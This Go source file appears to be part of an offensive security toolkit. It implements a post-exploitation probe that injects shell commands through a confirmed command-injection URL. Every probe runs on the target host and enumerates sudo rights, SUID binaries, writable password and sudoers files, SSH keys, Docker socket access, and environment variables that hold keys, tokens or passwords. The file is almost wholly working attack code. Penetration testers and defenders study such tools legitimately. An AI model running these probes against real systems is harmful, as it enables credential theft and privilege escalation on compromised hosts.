// privesc_probe — OMEGA post-exploit enumeration probe (Go core).
//
// Runs ONLY through a CONFIRMED command-injection point that the
// operator explicitly points at (template with a {CMD} marker, e.g.
// "http://h/x?c=;{CMD}"). Enumerates the host from the injected
// shell: identity, sudo rights, cron jobs, SUID binaries, writable
// sensitive paths, interesting env vars. Read-only enumeration —
// the tool never modifies the target host.
//
// EXPLOIT-GATED at the Python layer (PTK_EXPLOIT); the caller must
// also pass confirm_rce=true or the runner refuses.
//
// Input (JSON stdin):
//   {"template":"http://h/x?c=;{CMD}","method":"GET",
//    "cookie":"","concurrency":4,"timeout_ms":4000}
//
// Output (JSON stdout):
//   {"results":[{"check","output","flag"}]}
package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

type input struct {
	Template    string `json:"template"`
	Method      string `json:"method"`
	Body        string `json:"body"`
	Cookie      string `json:"cookie"`
	Concurrency int    `json:"concurrency"`
	TimeoutMs   int    `json:"timeout_ms"`
}

type row struct {
	Check  string `json:"check"`
	Output string `json:"output"`
	Flag   string `json:"flag"`
}

func emit(v interface{}) {
	out, _ := json.Marshal(v)
	fmt.Println(string(out))
}

type probe struct {
	name    string
	cmd     string
	flagged *regexp.Regexp
}

var probes = []probe{
	{"identity", "id;whoami;hostname", nil},
	{"os", "uname -a;cat /etc/os-release 2>/dev/null|head -2", nil},
	{"sudo", "sudo -n -l 2>&1", regexp.MustCompile(`(?i)\(ALL|NOPASSWD`)},
	{"cron", "crontab -l 2>&1;ls -la /etc/cron* 2>&1",
		regexp.MustCompile(`(?i)\S+\s+\S+`)},
	{"suid", "find / -perm -4000 -type f 2>/dev/null|head -20",
		regexp.MustCompile(`/usr/bin|/usr/sbin|/bin/`)},
	{"writable-sensitive", "find /etc /root -writable -type f 2>/dev/null|head -10",
		regexp.MustCompile(`/etc/passwd|/etc/shadow|/etc/sudoers`)},
	{"env-secrets", "env|grep -iE 'key|token|secret|pass|aws|api' | head -10",
		regexp.MustCompile(`(?i)=(\S{8,})`)},
	{"ssh-keys", "ls -la ~/.ssh 2>&1",
		regexp.MustCompile(`id_rsa|authorized_keys`)},
	{"docker", "ls -la /var/run/docker.sock 2>&1;groups",
		regexp.MustCompile(`docker\.sock|docker`)},
}

func main() {
	in, _ := io.ReadAll(bufio.NewReader(io.LimitReader(os.Stdin, 1<<20)))
	var cfg input
	if err := json.Unmarshal(in, &cfg); err != nil {
		emit(map[string]string{"error": "bad json input: " + err.Error()})
		return
	}
	if cfg.Template == "" || !strings.Contains(cfg.Template, "{CMD}") {
		emit(map[string]string{"error":
		"template with {CMD} marker required"})
		return
	}
	method := cfg.Method
	if method == "" {
		method = "GET"
	}
	tm := cfg.TimeoutMs
	if tm <= 0 {
		tm = 4000
	}
	cl := &http.Client{Timeout: time.Duration(tm) * time.Millisecond}

	results := []row{}
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 4)

	for _, p := range probes {
		wg.Add(1)
		sem <- struct{}{}
		go func(p probe) {
			defer wg.Done()
			defer func() { <-sem }()
			tgt := strings.Replace(cfg.Template, "{CMD}",
				url.QueryEscape(p.cmd), 1)
			var rd io.Reader
			if cfg.Body != "" && strings.EqualFold(method, "POST") {
				rd = strings.NewReader(strings.Replace(
					cfg.Body, "{CMD}", url.QueryEscape(p.cmd), 1))
			}
			req, err := http.NewRequest(strings.ToUpper(method), tgt, rd)
			if err != nil {
				return
			}
			if cfg.Cookie != "" {
				req.Header.Set("Cookie", cfg.Cookie)
			}
			req.Header.Set("User-Agent", "omegapesc/1.0")
			resp, err := cl.Do(req)
			if err != nil {
				return
			}
			sb := new(strings.Builder)
			sc := bufio.NewScanner(io.LimitReader(resp.Body, 32768))
			sc.Buffer(make([]byte, 32768), 32768)
			for sc.Scan() && sb.Len() < 16384 {
				sb.WriteString(sc.Text())
			}
			resp.Body.Close()
			out := strings.TrimSpace(sb.String())
			if out == "" {
				return
			}
			r := row{Check: p.name, Output: out[:min(len(out), 2048)],
				Flag: ""}
			if p.flagged != nil && p.flagged.MatchString(out) {
				r.Flag = "notable"
			}
			mu.Lock()
			results = append(results, r)
			mu.Unlock()
		}(p)
	}
	wg.Wait()
	emit(map[string]interface{}{"results": results})
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
